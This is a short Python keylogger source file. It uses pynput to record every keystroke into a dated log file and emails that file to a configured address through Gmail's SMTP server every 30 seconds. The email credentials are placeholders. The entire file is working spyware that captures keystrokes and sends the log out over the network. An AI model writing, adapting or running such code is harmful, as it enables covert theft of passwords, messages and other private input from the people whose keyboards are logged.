import time
import smtplib
import asyncio
import os.path
from pynput import keyboard
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

EMAIL_ADDRESS = 'your-email-here'
EMAIL_PASSWORD = 'your-password-here'

def file_write(char, file):
        logging = open(file, 'a')
        logging.write(char)
        logging.close()
        print(char)

def on_press(key):
    try:
        file_write(key.char, today_file)

    except:
        match key:
            case key.enter:
                key.char = "\n"
                
            case key.space:
                key.char = " "

            case key.esc:
                key.char = ''

            case key.ctrl_r | key.ctrl_r | key.ctrl_l:
                key.char = ''

            case _:
                return
                       
        file_write(key.char, today_file)


async def sendmail():
    while True:
        time.sleep(30)

        with open(today_file, 'rb') as file:
            file_data = file.read()
            file_name = 'arquivo.txt'
            file_type = 'text/plain'
            attachment = MIMEApplication(file_data, _subtype=file_type)
            attachment.add_header('content-disposition', 'attachment', filename=file_name)

        msg = MIMEMultipart()
        msg.add_header('From', EMAIL_ADDRESS)
        msg.add_header('To', EMAIL_ADDRESS)
        msg.add_header('Subject', 'teste')
        msg.attach(MIMEText('Arquivo referente ao logging de hoje', 'plain'))
        msg.attach(attachment)

        email_smtp = smtplib.SMTP(host='smtp.gmail.com', port=587)
        email_smtp.starttls()
        email_smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        email_smtp.send_message(msg)

today_file = 'keylogger_' + datetime.now().strftime('%d-%m-%Y') + '.txt'

with keyboard.Listener(on_press=on_press) as listener:
    if(os.path.isfile(today_file)):
        open(today_file, 'a')
    else:
        open(today_file, 'x')

    asyncio.run(sendmail())
    listener.join()